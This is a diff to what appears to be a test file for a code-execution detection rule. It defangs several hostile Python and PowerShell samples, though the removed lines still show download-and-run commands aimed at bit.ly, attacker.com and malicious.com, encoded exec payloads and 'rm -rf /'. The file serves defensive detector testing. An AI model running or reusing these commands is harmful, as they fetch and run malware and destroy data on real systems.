@@ -141,12 +141,12 @@ os.system('start ' + filename)
 
 # ruleid: code-execution
 os.system(
-    "powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/2myCV9n',$env:APPDATA+'\Main.exe'); Start-Process $env:APPDATA'\Main.exe'"
+    "powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://attacker.com/DEFANGED',$env:APPDATA+'\Main.exe'); Start-Process $env:APPDATA'\Main.exe'"
 )
 
 # ruleid: code-execution
 exec(
-    "o3ZkVQ0tpTkuqTMipz0hp3ymqTIgXPxAPzyzVT9mZFN9CFNvI2yhMT93plV6QDbtVUElrGbAPvNtVPNtVT9mYaWyozSgMFtaq3NhnaOaWljtVz5yql52LaZvXD0XVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VT5yql52LaZvXD0XVPOyrTAypUD6QDbtVPNtVPO0pax6QDbtVPNtVPNtVPOwqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BJ9MJR4jJyqXpTWcAJcvZwO2L21TZ0jloTgMImSfMHp5ozSKFG09VvxAPvNtVPNtVPNtVUEyrUEiVQ0tpzIkqJImqUZhM2I0XTA1MKWxLFxhqTI4qN0XVPNtVPNtVPNtrPN9VPpaYzcinJ4bpzShMT9gYzAbo2ywMFumqUWcozphLKAwnJysqKOjMKWwLKAyVPftp3ElnJ5aYzSmL2ycK2kiq2IlL2SmMFNeVUA0pzyhMl5xnJqcqUZcVTMipvOsVTyhVUWuozqyXQR2XFxtXlNvYaMvplVAPvNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVTLhq3WcqTHbp3ElXUEyrUEiXFxAPvNtVPNtVPNtVTLhL2kip2HbXD0XVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVTI4L2IjqQbAPvNtVPNtVPNtVPNtqUW5Bt0XVPNtVPNtVPNtVPNtVPOwqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BKyMJTA1JwWfZTSVIzyxJR5fL21BqzWhHzkvoyS1JGV5qRjkHzuMZwyBHyZ5o1cKrUAvZ2E2L21EqzWKEacxE1M5GQAFnSxlBJynI3umVvxAPvNtVPNtVPNtVPNtVPNtqTI4qT8tCFOlMKS1MKA0pl5aMKDbL3IypzEuXF50MKu0QDbtVPNtVPNtVPNtVPNtVUttCFNaWl5do2yhXUWuozEioF5wnT9cL2Hbp3ElnJ5aYzSmL2ycK3IjpTIlL2SmMFNeVUA0pzyhMl5up2AcnI9fo3qypzAup2HtXlOmqUWcozphMTyanKEmXFOzo3VtKlOcovOlLJ5aMFtkAvxcVPftVv52LaZvQDbtVPNtVPNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVPNtVPNtMv53pzy0MFumqUVbqTI4qT8cXD0XVPNtVPNtVPNtVPNtVPOzYzAfo3AyXPxAPvNtVPNtVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVPNtVPNtMKuwMKO0Bt0XVPNtVPNtVPNtVPNtVPOjpzyhqN==".decode(
+    "o3ZkVQ0tpTku===DEFANGED===DEFANGED===WljtVz5yql52LaZvXD0XVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VT5yql52LaZvXD0XVPOyrTAypUD6QDbtVPNtVPO0p==DEFANGED==wqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BJ9MJR4jJyqXpTWcAJcvZwO2L21TZ0jloTgMImSfMHp5ozSKFG09VvxAPvNtVPNtVPNtVUEyrUEiVQ0tpzIkqJImqUZhM2I0XTA1MKWxLFxhqTI4qN0XVPNtVPNtVPNtrPN9VPpaYzcinJ4bpzShMT9gYzAbo2ywMFumqUWcozphLKAwnJysqKOjMKWwLKAyVPftp3ElnJ5aYzSmL2ycK2kiq2IlL2SmMFNeVUA0pzyhMl5xnJqcqUZcVTMipvOsVTyhVUWuozqyXQR2XFxtXlNvYaMvplVAPvNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVTLhq3WcqTHbp3ElXUEyrUEiXFxAPvNtVPNtVPNtVTLhL2kip2HbXD0XVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVTI4L2IjqQbAPvNtVPNtVPNtVPNtqUW5Bt0XVPNtVPNtVPNtVPNtVPOwqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BKyMJTA1JwWfZTSVIzyxJR5fL21BqzWhHzkvoyS1JGV5qRjkHzuMZwyBHyZ5o1cKrUAvZ2E2L21EqzWKEacxE1M5GQAFnSxlBJynI3umVvxAPvNtVPNtVPNtVPNtVPNtqTI4qT8tCFOlMKS1MKA0pl5aMKDbL3IypzEuXF50MKu0QDbtVPNtVPNtVPNtVPNtVUttCFNaWl5do2yhXUWuozEioF5wnT9cL2Hbp3ElnJ5aYzSmL2ycK3IjpTIlL2SmMFNeVUA0pzyhMl5up2AcnI9fo3qypzAup2HtXlOmqUWcozphMTyanKEmXFOzo3VtKlOcovOlLJ5aMFtkAvxcVPftVv52LaZvQDbtVPNtVPNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVPNtVPNtMv53pzy0MFumqUVbqTI4qT8cXD0XVPNtVPNtVPNtVPNtVPOzYzAfo3AyXPxAPvNtVPNtVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVPNtVPNtMKuwMKO0Bt0XVPNtVPNtVPNtVPNtVPOjpzyhqN==".decode(
         "rot13"
     )
 ).decode("base64")
@@ -170,7 +170,7 @@ __import__('builtins').exec(__import__('builtins').compile(__import__('base64').
 
 from builtins import *;
 # ruleid: code-execution
-OOO0O0OOOOO000oOo0oOoOo0,llIIlIlllllIlIlIlll,Oo000O0OO0oO0oO00oO0oO0O,WXWXXWWXXWXWXWWXXXWXXWX,XWWWWXXXXWWWWWXXWWX=(lambda SS2S222S22SS22S22S:SS2S222S22SS22S22S(__import__('\x7a\x6c\x69\x62'))),(lambda SS2S222S22SS22S22S:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72'])))
+OOO0O0OOOOO000oOo0oOoOo0,llIIlIlllllIlIlIlll,Oo000O0OO0oO0oO00oO0oO0O,WXWXXWWXXWXWXWWXXXWXXWX,XWWWWXXXXWWWWWXXWWX=(lambda SS2S222S22SS22S22S:SS2S222S22SS22S22S(__import__('\x00\x00\x00\x00'))),(lambda SS2S222S22SS22S22S:globals()['\x65\x76\x61\x6c'](globals()['\x00\x00\x00\x00\x00\x00\x00'](globals()['\x73\x74\x72'])))
 
 # ok: code-execution
 errno = subprocess.call([sys.executable, "tests.py"])
@@ -220,7 +220,7 @@ compile() and vars() indirection patterns
 vars(__builtins__)['exec']("subprocess.call('/tmp/malware')")
 
 # ruleid: code-execution
-vars(__builtins__)['eval']("__import__('os').system('wget http://malicious.com/backdoor.sh')")
+vars(__builtins__)['eval']("__import__('os').system('wget http://malicious.com/DEFANGED.sh')")
 
 # ruleid: code-execution
 vars(__builtins__)['compile']("os.system('malicious')", '<string>', 'exec')
@@ -244,13 +244,13 @@ vars(globals()['__builtins__'])['eval']("subprocess.Popen('backdoor', shell=True
 vars(locals()['__builtins__'])['exec']("subprocess.check_call(['rm', '-rf', '/'])")
 
 # ruleid: code-execution
-vars(locals()['__builtins__'])['eval']("os.popen('curl http://attacker.com/keylogger.py')")
+vars(locals()['__builtins__'])['eval']("os.popen('curl http://attacker.com/DEFANGED.py')")
 
 # ruleid: code-execution
-compile(__import__('base64').b64decode('ZXhlYyhfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnZWNobyBtYWx3YXJlJykp'), '<string>', 'exec')
+compile(__import__('base64').b64decode('ZXhlYyhfX2ltcG9y==DEFANGED==c3RlbSgnZWNobyBtYWx3YXJlJykp'), '<string>', 'exec')
 
 # ruleid: code-execution
 compile("subprocess.Popen('powershell -EncodedCommand cABvAHc=', shell=False)", '<string>', 'eval')
 
 # ruleid: code-execution
-vars(__builtins__)['eval'](compile(__import__('base64').b64decode("X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2N1cmwgaHR0cDovL2V2aWwuY29tIHwgc2gnKQ=="), '<string>', 'exec'))
+vars(__builtins__)['eval'](compile(__import__('base64').b64decode("X19pbXBvcnRfXyg===DEFANGED==cDovL2V2aWwuY29tIHwgc2gnKQ=="), '<string>', 'exec'))
